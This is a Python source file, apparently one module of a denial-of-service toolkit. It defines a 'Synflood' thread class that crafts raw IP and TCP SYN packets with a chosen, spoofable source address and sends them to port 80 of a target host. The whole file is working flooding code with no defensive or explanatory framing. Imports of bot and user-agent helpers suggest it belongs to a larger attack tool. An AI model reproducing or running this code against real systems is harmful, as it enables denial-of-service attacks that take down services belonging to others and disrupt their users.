from socket import *
from struct import *
from threading import Thread, Lock
import sys
from termcolor import cprint
from socket import IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL
from ..add_bots import add_bots
from ..add_useragent import add_useragent
class Synflood(Thread):
	def __init__(self,tgt,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
			self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		else:
			self.sock=sock
		self.lock=Lock()
	def checksum(self):
		s = 0 
		for i in range(0,len(self.psh),2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i+1]))
			s = s+w

		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s
	def Building_packet(self):
		ihl=5
		version=4
		tos=0
		tot=40
		id=54321
		frag_off=0
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet

	def run(self):
		packet=self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet,(self.tgt,0))
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		except Exception as e:
			cprint(e,'red')
		finally:
			self.lock.release()
